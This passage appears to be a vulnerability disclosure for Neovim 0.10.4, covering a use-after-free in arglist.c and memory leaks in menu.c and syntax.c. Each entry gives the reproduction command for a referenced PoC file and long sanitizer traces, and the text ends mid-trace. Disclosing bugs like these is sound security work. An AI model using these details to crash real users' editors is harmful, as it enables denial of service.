# 1. Neovim <=0.10.4 Use-After-Free in `src/nvim/arglist.c`

## Description
Neovim versions up to and including 0.10.4 are affected by a vulnerability where a use-after-free occurs in the `arglist.c` file at line 221. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to access memory that has already been freed. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C2443374](./C2443374).
```sh
$ ./nvims/neovim-0.10.4/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C2443374 -c :qa!
------------------------------Output------------------------------

------------------------------Error-------------------------------
=================================================================
==15831==ERROR: AddressSanitizer: heap-use-after-free on address 0x603000005660 at pc 0x000000779773 bp 0x7ffee51e3c50 sp 0x7ffee51e3c48
READ of size 8 at 0x603000005660 thread T0
    #0 0x779772 in alist_add /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:221:5
    #1 0x7792b7 in alist_set /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:191:7
    #2 0x77ac04 in do_arglist /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:468:7
    #3 0x77f956 in ex_next /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:705:11
    #4 0x77d748 in ex_args /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:546:5
    #5 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #6 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #7 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #8 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5
    #9 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #10 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #11 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #12 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #13 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #14 0xdcdfb0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:374:10
    #15 0x11cee89 in exe_commands /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:1909:5
    #16 0x11b75cf in main /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:594:5
    #17 0x7f6d70a83d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #18 0x7f6d70a83e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #19 0x480fc4 in _start (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x480fc4)

0x603000005660 is located 16 bytes inside of 32-byte region [0x603000005650,0x603000005670)
freed by thread T0 here:
    #0 0x4fbc22 in free (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fbc22)
    #1 0x13a35a9 in xfree /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:144:3
    #2 0x77879a in alist_unlink /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:116:5
    #3 0x1f3cad0 in win_free /root/vuln/nvims/neovim-0.10.4/src/nvim/window.c:5207:3
    #4 0x1f287f7 in win_free_mem /root/vuln/nvims/neovim-0.10.4/src/nvim/window.c:3100:3
    #5 0x1edf574 in win_close /root/vuln/nvims/neovim-0.10.4/src/nvim/window.c:2858:8
    #6 0x7df5bc in do_buffer /root/vuln/nvims/neovim-0.10.4/src/nvim/buffer.c:1391:11
    #7 0x7e6b68 in do_bufdel /root/vuln/nvims/neovim-0.10.4/src/nvim/buffer.c:1057:5
    #8 0xe26ea8 in ex_bunload /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:4467:17
    #9 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #10 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #11 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #12 0x7b0bb0 in apply_autocmds_group /root/vuln/nvims/neovim-0.10.4/src/nvim/autocmd.c:1830:5
    #13 0x7b95c0 in apply_autocmds /root/vuln/nvims/neovim-0.10.4/src/nvim/autocmd.c:1498:10
    #14 0x7e6541 in buflist_new /root/vuln/nvims/neovim-0.10.4/src/nvim/buffer.c:2009:9
    #15 0x7ff2e0 in buflist_add /root/vuln/nvims/neovim-0.10.4/src/nvim/buffer.c:3091:16
    #16 0x7796ac in alist_add /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:222:7
    #17 0x7792b7 in alist_set /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:191:7
    #18 0x77ac04 in do_arglist /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:468:7
    #19 0x77f956 in ex_next /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:705:11
    #20 0x77d748 in ex_args /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:546:5
    #21 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #22 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #23 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #24 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5

previously allocated by thread T0 here:
    #0 0x4fbe8d in malloc (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fbe8d)
    #1 0x13a32f7 in try_malloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:98:15
    #2 0x13a34ec in xmalloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:132:15
    #3 0x7787c4 in alist_new /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:123:21
    #4 0x77d61a in ex_args /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:536:7
    #5 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #6 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #7 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #8 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5
    #9 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #10 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #11 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #12 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #13 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #14 0xdcdfb0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:374:10
    #15 0x11cee89 in exe_commands /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:1909:5
    #16 0x11b75cf in main /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:594:5
    #17 0x7f6d70a83d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-use-after-free /root/vuln/nvims/neovim-0.10.4/src/nvim/arglist.c:221:5 in alist_add
Shadow bytes around the buggy address:
  0x0c067fff8a70: fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fa
  0x0c067fff8a80: fa fa fd fd fd fa fa fa fd fd fd fd fa fa fd fd
  0x0c067fff8a90: fd fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa
  0x0c067fff8aa0: fd fd fd fa fa fa 00 00 05 fa fa fa 00 00 05 fa
  0x0c067fff8ab0: fa fa fd fd fd fa fa fa fd fd fd fd fa fa 00 00
=>0x0c067fff8ac0: 02 fa fa fa fd fd fd fd fa fa fd fd[fd]fd fa fa
  0x0c067fff8ad0: fd fd fd fa fa fa fd fd fd fa fa fa fd fd fd fd
  0x0c067fff8ae0: fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd
  0x0c067fff8af0: fd fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa
  0x0c067fff8b00: fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fa
  0x0c067fff8b10: fa fa fd fd fd fa fa fa fd fd fd fd fa fa 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==15831==ABORTING
```

# 2. Neovim <=0.10.4 Memory Leak in `src/nvim/menu.c`

## Description
Neovim versions up to and including 0.10.4 are affected by a memory leak vulnerability in the `menu.c` file, specifically within the `add_menu_path` function. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to allocate memory without properly freeing it. The vulnerability could be exploited by an attacker to cause resource exhaustion, leading to a denial of service (DoS) condition.

## PoC
poc at [C222257](./C222257).
```sh
$ ./nvims/neovim-0.10.4/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C222257 -c :qa!
------------------------------Output------------------------------

------------------------------Error-------------------------------

=================================================================
==15907==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 192 byte(s) in 1 object(s) allocated from:
    #0 0x4fc002 in calloc (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fc002)
    #1 0x13a364b in xcalloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:158:15
    #2 0x13af7fc in add_menu_path /root/vuln/nvims/neovim-0.10.4/src/nvim/menu.c:348:14
    #3 0x13ab760 in ex_menu /root/vuln/nvims/neovim-0.10.4/src/nvim/menu.c:241:5
    #4 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #5 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #6 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #7 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5
    #8 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #9 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #10 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #11 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #12 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #13 0xdcdfb0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:374:10
    #14 0x11cee89 in exe_commands /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:1909:5
    #15 0x11b75cf in main /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:594:5
    #16 0x7f0e6c6fed8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

Indirect leak of 4 byte(s) in 1 object(s) allocated from:
    #0 0x4fbe8d in malloc (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fbe8d)
    #1 0x13a32f7 in try_malloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:98:15
    #2 0x13a34ec in xmalloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:132:15
    #3 0x13a38a0 in xmallocz /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:204:15
    #4 0x13a39fe in xmemdupz /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:222:17
    #5 0x13a4f98 in xstrdup /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:469:10
    #6 0x13b0baa in add_menu_path /root/vuln/nvims/neovim-0.10.4/src/nvim/menu.c:401:44
    #7 0x13ab760 in ex_menu /root/vuln/nvims/neovim-0.10.4/src/nvim/menu.c:241:5
    #8 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #9 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #10 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #11 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5
    #12 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #13 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #14 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #15 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #16 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #17 0xdcdfb0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:374:10
    #18 0x11cee89 in exe_commands /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:1909:5
    #19 0x11b75cf in main /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:594:5
    #20 0x7f0e6c6fed8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

Indirect leak of 2 byte(s) in 1 object(s) allocated from:
    #0 0x4fbe8d in malloc (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fbe8d)
    #1 0x13a32f7 in try_malloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:98:15
    #2 0x13a34ec in xmalloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:132:15
    #3 0x13a38a0 in xmallocz /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:204:15
    #4 0x13a39fe in xmemdupz /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:222:17
    #5 0x13a4f98 in xstrdup /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:469:10
    #6 0x13bf55f in menu_text /root/vuln/nvims/neovim-0.10.4/src/nvim/menu.c:1301:12
    #7 0x13afb82 in add_menu_path /root/vuln/nvims/neovim-0.10.4/src/nvim/menu.c:354:21
    #8 0x13ab760 in ex_menu /root/vuln/nvims/neovim-0.10.4/src/nvim/menu.c:241:5
    #9 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #10 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #11 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #12 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5
    #13 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #14 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #15 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #16 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #17 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #18 0xdcdfb0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:374:10
    #19 0x11cee89 in exe_commands /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:1909:5
    #20 0x11b75cf in main /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:594:5
    #21 0x7f0e6c6fed8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

Indirect leak of 2 byte(s) in 1 object(s) allocated from:
    #0 0x4fbe8d in malloc (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fbe8d)
    #1 0x13a32f7 in try_malloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:98:15
    #2 0x13a34ec in xmalloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:132:15
    #3 0x13a38a0 in xmallocz /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:204:15
    #4 0x13a39fe in xmemdupz /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:222:17
    #5 0x13a4f98 in xstrdup /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:469:10
    #6 0x13af9eb in add_menu_path /root/vuln/nvims/neovim-0.10.4/src/nvim/menu.c:352:20
    #7 0x13ab760 in ex_menu /root/vuln/nvims/neovim-0.10.4/src/nvim/menu.c:241:5
    #8 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #9 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #10 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #11 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5
    #12 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #13 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #14 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #15 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #16 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #17 0xdcdfb0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:374:10
    #18 0x11cee89 in exe_commands /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:1909:5
    #19 0x11b75cf in main /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:594:5
    #20 0x7f0e6c6fed8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: 200 byte(s) leaked in 4 allocation(s).
```

# 3. Neovim <=0.10.4 Memory Leak in `src/nvim/syntax.c`

## Description
Neovim versions up to and including 0.10.4 are affected by a memory leak vulnerability, where the application fails to release allocated memory when processing certain commands or files. This issue is triggered within the `ex_ownsyntax` function, which is responsible for managing syntax highlighting rules. The memory leak could be exploited by an attacker to cause resource exhaustion, leading to a denial of service (DoS) condition.

## PoC
poc at [C223278](./C223278).
```sh
$ ./nvims/neovim-0.10.4/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C223278 -c :qa!
 41 so
 39 so

=================================================================
==17740==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 2336 byte(s) in 2 object(s) allocated from:
    #0 0x4fc002 in calloc (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fc002)
    #1 0x13a364b in xcalloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:158:15
    #2 0x1b9ce36 in ex_ownsyntax /root/vuln/nvims/neovim-0.10.4/src/nvim/syntax.c:5247:19
    #3 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #4 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #5 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #6 0x18c6236 in source_using_linegetter /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1980:16
    #7 0x18c5a1a in cmd_source_buffer /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2016:5
    #8 0x18c3c83 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1783:5
    #9 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #10 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #11 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #12 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #13 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5
    #14 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #15 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #16 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #17 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #18 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #19 0xdcdfb0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:374:10
    #20 0x11cee89 in exe_commands /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:1909:5
    #21 0x11b75cf in main /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:594:5
    #22 0x7f521a01bd8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

Direct leak of 2336 byte(s) in 2 object(s) allocated from:
    #0 0x4fc002 in calloc (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fc002)
    #1 0x13a364b in xcalloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:158:15
    #2 0x1b9ce36 in ex_ownsyntax /root/vuln/nvims/neovim-0.10.4/src/nvim/syntax.c:5247:19
    #3 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #4 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #5 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #6 0x18c6236 in source_using_linegetter /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1980:16
    #7 0x18c5a1a in cmd_source_buffer /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2016:5
    #8 0x18c3c83 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1783:5
    #9 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #10 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #11 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #12 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #13 0x18c6236 in source_using_linegetter /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1980:16
    #14 0x18c5a1a in cmd_source_buffer /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2016:5
    #15 0x18c3c83 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1783:5
    #16 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #17 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #18 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #19 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #20 0x18c9ec6 in do_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2240:5
    #21 0x18c4072 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1796:14
    #22 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #23 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #24 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #25 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #26 0xdcdfb0 in do_cmdline_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:374:10
    #27 0x11cee89 in exe_commands /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:1909:5
    #28 0x11b75cf in main /root/vuln/nvims/neovim-0.10.4/src/nvim/main.c:594:5
    #29 0x7f521a01bd8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

Direct leak of 2336 byte(s) in 2 object(s) allocated from:
    #0 0x4fc002 in calloc (/root/vuln/nvims/neovim-0.10.4/build/bin/nvim+0x4fc002)
    #1 0x13a364b in xcalloc /root/vuln/nvims/neovim-0.10.4/src/nvim/memory.c:158:15
    #2 0x1b9ce36 in ex_ownsyntax /root/vuln/nvims/neovim-0.10.4/src/nvim/syntax.c:5247:19
    #3 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #4 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #5 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #6 0x18c6236 in source_using_linegetter /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1980:16
    #7 0x18c5a1a in cmd_source_buffer /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2016:5
    #8 0x18c3c83 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1783:5
    #9 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #10 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #11 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #12 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #13 0x18c6236 in source_using_linegetter /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1980:16
    #14 0x18c5a1a in cmd_source_buffer /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2016:5
    #15 0x18c3c83 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1783:5
    #16 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #17 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #18 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #19 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
    #20 0x18c6236 in source_using_linegetter /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1980:16
    #21 0x18c5a1a in cmd_source_buffer /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:2016:5
    #22 0x18c3c83 in cmd_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1783:5
    #23 0x18c3bc3 in ex_source /root/vuln/nvims/neovim-0.10.4/src/nvim/runtime.c:1804:3
    #24 0xdfdb9b in execute_cmd0 /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:1706:7
    #25 0xdd8cc7 in do_one_cmd /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:2375:7
    #26 0xdc8ab8 in do_cmdline /root/vuln/nvims/neovim-0.10.4/src/nvim/ex_docmd.c:665:20
